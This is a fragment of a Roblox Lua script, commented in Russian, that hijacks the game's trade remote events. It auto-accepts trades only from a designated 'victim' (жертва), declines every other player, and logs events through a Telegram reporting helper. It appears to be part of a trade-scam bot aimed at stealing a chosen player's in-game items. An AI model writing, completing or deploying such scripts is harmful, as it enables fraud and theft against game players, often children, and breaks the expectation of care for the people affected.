local Trade = ReplicatedStorage:WaitForChild("Trade", 100)

local function connectHandlers()
    Trade.SendRequest.OnClientInvoke = function(arg1)
        if not arg1 then
            Trade.DeclineRequest:FireServer()
            return false
        end

        local senderName = type(arg1) == "userdata" and arg1.Name or tostring(arg1)
        print("SendRequest от:", senderName)

        if namesMatch(targetName, senderName) then
            print("✅ жертва кинула запрос")
            Trade.AcceptRequest:FireServer()
            return true
        else
            print("❌ не жертва:", senderName)
            telegramTrade("запрос не от жертвы", "от: " .. tostring(senderName))
            skipTgOnce("DeclineRequest")
            Trade.DeclineRequest:FireServer()
            return false
        end
    end
end

-- первичное подключение
connectHandlers()

local function parseTradePartner(value)
    if not value then return nil end
    if type(value) == "userdata" then
        local ok, name = pcall(function() return value.Name end)
        if ok and name then return tostring(name) end
    end
    if type(value) == "string" and value ~= "" then
        return value
    end
    return nil
end

Trade.StartTrade.OnClientEvent:Connect(function(arg1, arg2)
    local name = parseTradePartner(arg2) or ""
    print("StartTrade, игрок:", name)
    connectHandlers()

    if name ~= "" and namesMatch(targetName, name) then
        print("✅ жертва в StartTrade")
    elseif name == "" then
        print("⚠️ StartTrade без имени партнёра — не отклоняем")
    else
        print("❌ не жертва в StartTrade:", name, "ожидали:", tostring(targetName))
        telegramTrade("StartTrade: чужой партнёр", "от: " .. tostring(name) .. ", ожидали: " .. tostring(targetName))
        skipTgOnce("DeclineTrade")
        Trade.DeclineTrade:FireServer()
    end
end)

